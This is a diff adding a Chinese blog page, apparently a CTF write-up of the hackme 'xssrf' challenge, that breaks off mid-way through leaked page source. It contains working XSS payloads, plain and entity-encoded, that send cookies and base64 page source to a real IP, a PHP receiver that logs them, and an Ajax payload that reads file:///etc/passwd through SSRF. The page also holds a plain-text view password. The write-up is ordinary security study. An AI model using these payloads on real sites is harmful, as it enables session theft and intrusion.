@@ -1,0 +1,1572 @@
+<!DOCTYPE html>
+
+
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="文章访问需要密码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS　&amp;&amp;　SSRF">
+<meta property="og:url" content="http://yoursite.com/2019/07/25/XSS && SSRF/index.html">
+<meta property="og:site_name" content="gtfly">
+<meta property="og:description" content="文章访问需要密码">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://imgur.com/blCuBXJ.png">
+<meta property="og:image" content="https://imgur.com/94ikEx1.png">
+<meta property="og:image" content="https://imgur.com/kQspo7u.png">
+<meta property="og:image" content="https://imgur.com/aD1UnDR.png">
+<meta property="og:updated_time" content="2019-07-24T13:47:28.864Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS　&amp;&amp;　SSRF">
+<meta name="twitter:description" content="文章访问需要密码">
+<meta name="twitter:image" content="https://imgur.com/blCuBXJ.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeIn","post_body":"fadeIn","coll_header":"fadeIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/07/25/XSS && SSRF/">
+
+
+
+
+
+<script>
+    (function(){
+        if('1094272094jieyan'){
+            if (prompt('请输入查看密码') !== '1094272094jieyan'){
+                alert('密码不正确,请询问主编大大');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+  <title>XSS　&&　SSRF | gtfly</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><script> 
+ function GetRandomNum(Min,Max) 
+ { 
+    var Range = Max - Min; 
+    var Rand = Math.random(); 
+    return(Min + Math.round(Rand * Range)); 
+ } 
+ function setSidebarMarginTop (headerOffset) { 
+    return $('#sidebar').css({ 'margin-top': headerOffset }); 
+ } 
+ function getHeaderOffset () { 
+    return $('.header-inner').height() + CONFIG.sidebar.offset; 
+ }
+    window.onload=function() { 
+    var subtitle = "人生如逆旅，我亦是行人。"; 
+    var mytitle = subtitle.split("W"); 
+    var max = mytitle.length-1;
+    var index = GetRandomNum(0,max); 
+    var text = mytitle[index]; 
+    $("#helloTitle").html(text); 
+    var headOffset = getHeaderOffset(); 
+    setSidebarMarginTop(headOffset); 
+// alert(getHeaderOffset()); 
+ }  
+</script>
+
+<div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">gtfly</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人生如逆旅，我亦是行人。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-resource">
+          <a href="https://github.com/gtfly?tab=stars" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-star"></i> <br>
+            
+            资源
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-paper-plane"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/XSS && SSRF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="gtfly">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="gtfly">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XSS　&&　SSRF</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-25T14:11:32+08:00">
+                2019-07-25
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-07-24T21:47:28+08:00">
+                2019-07-24
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/07/25/XSS && SSRF/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/07/25/XSS && SSRF/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+              <div class="post-description">
+                  文章访问需要密码
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>前两天学了些ssrf，今天偶尔看到了一篇wp，写的是关于hackme 平台上xssrf这道题的，通过xss-ssrf-redis来拿到flag，很有意思，遂学习一波</p>
+<a id="more"></a>
+<p>复习有关XSS的一些基础知识</p>
+<h3 id="HTML-DOM-Document对象"><a href="#HTML-DOM-Document对象" class="headerlink" title="HTML DOM Document对象"></a>HTML DOM Document对象</h3><p>1.在 HTML DOM (Document Object Model) 中 , 每一个元素都是 节点:</p>
+<ul>
+<li><p>文档是一个文档节点。</p>
+</li>
+<li><p>所有的HTML元素都是元素节点。</p>
+</li>
+<li><p>所有 HTML 属性都是属性节点。</p>
+</li>
+<li><p>文本插入到 HTML 元素是文本节点。are text nodes。</p>
+</li>
+<li><p>注释是注释节点。</p>
+</li>
+</ul>
+<p>2.当浏览器载入 HTML 文档, 它就会成为 Document 对象。</p>
+<p>Document 对象是 HTML 文档的根节点。</p>
+<p>Document 对象使我们可以从脚本中对 HTML 页面中的所有元素进行访问。</p>
+<p>3.常用的Document对象的属性和方法</p>
+<ul>
+<li><p>document.body：返回文档的body元素</p>
+<ul>
+<li>document.body.innerHTML：获取当前文档的HTML的内容 </li>
+</ul>
+</li>
+<li><p>document.cookie     设置或返回与当前文档有关的所有 cookie</p>
+</li>
+</ul>
+<p>4.Location 对象包含有关当前 URL 的信息</p>
+<h3 id="XSS平台搭建"><a href="#XSS平台搭建" class="headerlink" title="XSS平台搭建"></a>XSS平台搭建</h3><p>现在网上好多XSS平台都不能用了</p>
+<p>BlueLotus_XSSReceiver的开源XSS平台：<a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p>
+<p>XSS获取网页源码插件：<a href="https://www.cnblogs.com/afanti/p/8277344.html" target="_blank" rel="noopener">https://www.cnblogs.com/afanti/p/8277344.html</a></p>
+<p>但是用了XSS平台后就感觉使用XSS平台没有直接使用服务器方便</p>
+<h3 id="XSS-Payload"><a href="#XSS-Payload" class="headerlink" title="XSS Payload"></a>XSS Payload</h3><p>首先，先在服务器开放一个端口，创建index.php，写入：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">'log.php'</span>, $_SERVER[<span class="string">'QUERY_STRING'</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>之后的XSS只需把请求的目标vps改为自己新建的这个服务ip端口即可，直接查看<code>log.php</code>即可得到攻击的信息；原理就是，当admin查看你输入的恶意代码时，会触发事件，向vps发送请求，且会获取admin页面的参数信息如cookie、页面源码等作为参数一并发送到vps接收端，vps获取请求参数并将其写入log文件内</p>
+<p>1.获取网页Cookie：</p>
+<pre><code>&lt;svg/onload=&quot;document.location=&apos;http://101.132.41.135:1262/?&apos;+document.cookie&quot;&gt;</code></pre><p>实体编码后：</p>
+<pre><code>&lt;svg/onload=&quot;&amp;#x64;&amp;#x6F;&amp;#x63;&amp;#x75;&amp;#x6D;&amp;#x65;&amp;#x6E;&amp;#x74;&amp;#x2E;&amp;#x6C;&amp;#x6F;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6F;&amp;#x6E;&amp;#x3D;&amp;#x27;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3A;&amp;#x2F;&amp;#x2F;&amp;#x31;&amp;#x30;&amp;#x31;&amp;#x2E;&amp;#x31;&amp;#x33;&amp;#x32;&amp;#x2E;&amp;#x34;&amp;#x31;&amp;#x2E;&amp;#x31;&amp;#x33;&amp;#x35;&amp;#x3A;&amp;#x31;&amp;#x32;&amp;#x36;&amp;#x32;&amp;#x2F;&amp;#x3F;&amp;#x27;&amp;#x2B;&amp;#x64;&amp;#x6F;&amp;#x63;&amp;#x75;&amp;#x6D;&amp;#x65;&amp;#x6E;&amp;#x74;&amp;#x2E;&amp;#x63;&amp;#x6F;&amp;#x6F;&amp;#x6B;&amp;#x69;&amp;#x65;&quot;&gt;</code></pre><p>2.获取网页源码：</p>
+<pre><code>&lt;svg/onload=&quot;document.location=&apos;http://101.132.41.135:1262/?&apos;+btoa(document.body.innerHTML)&quot;&gt;</code></pre><p>实体编码后：</p>
+<pre><code>&lt;svg/onload=&quot;&amp;#x64;&amp;#x6F;&amp;#x63;&amp;#x75;&amp;#x6D;&amp;#x65;&amp;#x6E;&amp;#x74;&amp;#x2E;&amp;#x6C;&amp;#x6F;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6F;&amp;#x6E;&amp;#x3D;&amp;#x27;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3A;&amp;#x2F;&amp;#x2F;&amp;#x31;&amp;#x30;&amp;#x31;&amp;#x2E;&amp;#x31;&amp;#x33;&amp;#x32;&amp;#x2E;&amp;#x34;&amp;#x31;&amp;#x2E;&amp;#x31;&amp;#x33;&amp;#x35;&amp;#x3A;&amp;#x31;&amp;#x32;&amp;#x36;&amp;#x32;&amp;#x2F;&amp;#x3F;&amp;#x27;&amp;#x2B;&amp;#x62;&amp;#x74;&amp;#x6F;&amp;#x61;&amp;#x28;&amp;#x64;&amp;#x6F;&amp;#x63;&amp;#x75;&amp;#x6D;&amp;#x65;&amp;#x6E;&amp;#x74;&amp;#x2E;&amp;#x62;&amp;#x6F;&amp;#x64;&amp;#x79;&amp;#x2E;&amp;#x69;&amp;#x6E;&amp;#x6E;&amp;#x65;&amp;#x72;&amp;#x48;&amp;#x54;&amp;#x4D;&amp;#x4C;&amp;#x29;&quot;&gt;</code></pre><p>3.Ajax请求</p>
+<p>可以用此方法在请求时指定内网路径和参数，如POST数据的payload：</p>
+<pre><code>&lt;svg/onload=&quot;
+xmlhttp=new XMLHttpRequest();
+xmlhttp.onreadystatechange=function()
+{
+    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)
+    {
+        document.location=&apos;http://101.132.41.135:1262/?&apos;+btoa(xmlhttp.responseText);
+    }
+}
+xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);
+xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+xmlhttp.send(&quot;url=file:///etc/passwd&quot;);
+&quot;&gt;</code></pre><p>HTML实体在线编码网址：<a href="https://www.qqxiuzi.cn/bianma/zifushiti.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/zifushiti.php</a></p>
+<h3 id="hackme-xssrf"><a href="#hackme-xssrf" class="headerlink" title="hackme xssrf"></a>hackme xssrf</h3><p>这相当于一道题目藏了三个flag，不过hackme平台把题目分成三道题了</p>
+<p>在测试时，发现打不到cookie，但源码可以打到，不知道是不是题目的问题…不过这道题的第一个藏在cookie中的flag与第二个和第三个flag没什么关系，所以跳过第一个，直接进行第二步和第三步</p>
+<p>首先进行信息收集，扫到以下路径：</p>
+<p><img src="https://imgur.com/blCuBXJ.png" alt></p>
+<p>git只是具有诱导作用，并不能恢复出文件；backup.zip下载后需要密码才能解压；访问robots.txt文件，得到以下信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /config.php</span><br><span class="line">Disallow: /you/cant/read/config.php/can/you?</span><br><span class="line">Disallow: /backup.zip</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>/config.php</code>不过什么都没显示；接下来进行xss探测：</p>
+<p><img src="https://imgur.com/94ikEx1.png" alt></p>
+<p><img src="https://imgur.com/kQspo7u.png" alt></p>
+<p>可以得到admin访问的路径<code>Referer: http://localhost/read.php?id=5520</code></p>
+<p>由于没有成功打到cookie，这里就不打cookie了</p>
+<p>读取<code>read.php</code>源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark d-flex&quot;&gt;</span><br><span class="line">  &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;XSSRF&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">  &lt;ul class=&quot;navbar-nav&quot;&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;sendmail.php&quot;&gt;Send Mail&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;mailbox.php&quot;&gt;Mailbox&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;sentmail.php&quot;&gt;Sent Mail&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;setadmin.php&quot;&gt;Set Admin&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;request.php&quot;&gt;Send Request&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">  &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">      &lt;span class=&quot;navbar-text&quot;&gt;Hello, admin (Administrator)&lt;/span&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;logout.php&quot;&gt;Logout&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">&lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div class=&quot;card text-white bg-dark&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;card-body&quot;&gt;</span><br><span class="line">          &lt;h2 class=&quot;card-title&quot;&gt;</span><br><span class="line">            asdf          &lt;/h2&gt;</span><br><span class="line">          &lt;h4&gt;From: &lt;a href=&quot;sendmail.php?to=dropsec&quot;&gt;dropsec&lt;/a&gt;&lt;/h4&gt;</span><br><span class="line">          &lt;div class=&quot;card-text&quot;&gt;&lt;svg onload=&quot;document.location=&apos;http://101.132.41.135:1262/?&apos;+btoa(document.body.innerHTML)&quot;&gt;&lt;/svg&gt;&lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现其中多了两个文件，一个<code>setadmin.php</code>，一个<code>request.php</code>，用Ajax请求来分别获取这两个文件源码</p>
+<p>setadmin.php：                                                                                                           </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;XSSRF - Set Admin&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;bootstrap/css/bootstrap.min.css&quot; media=&quot;all&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot; media=&quot;all&quot;&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">&lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark d-flex&quot;&gt;</span><br><span class="line">  &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;XSSRF&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">  &lt;ul class=&quot;navbar-nav&quot;&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;sendmail.php&quot;&gt;Send Mail&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;mailbox.php&quot;&gt;Mailbox&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;sentmail.php&quot;&gt;Sent Mail&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;setadmin.php&quot;&gt;Set Admin&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;request.php&quot;&gt;Send Request&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">  &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">      &lt;span class=&quot;navbar-text&quot;&gt;Hello, admin (Administrator)&lt;/span&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;logout.php&quot;&gt;Logout&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">&lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">      &lt;form action=&quot;/setadmin.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;form-group&quot;&gt;</span><br><span class="line">          &lt;label for=&quot;username&quot;&gt;Username&lt;/label&gt;</span><br><span class="line">          &lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;form-control&quot; id=&quot;username&quot; aria-describedby=&quot;username&quot; placeholder=&quot;Username&quot;&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">        &lt;button class=&quot;btn btn-primary&quot;&gt;Give Admin Access&lt;/button&gt;</span><br><span class="line">      &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>request.php：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;XSSRF - Request&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;bootstrap/css/bootstrap.min.css&quot; media=&quot;all&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot; media=&quot;all&quot;&gt;</span><br><span class="line">    &lt;style&gt;pre &#123; background-color: #eee; padding: 5px; &#125;&lt;/style&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">&lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark d-flex&quot;&gt;</span><br><span class="line">  &lt;a class=&quot;navbar-brand&quot; 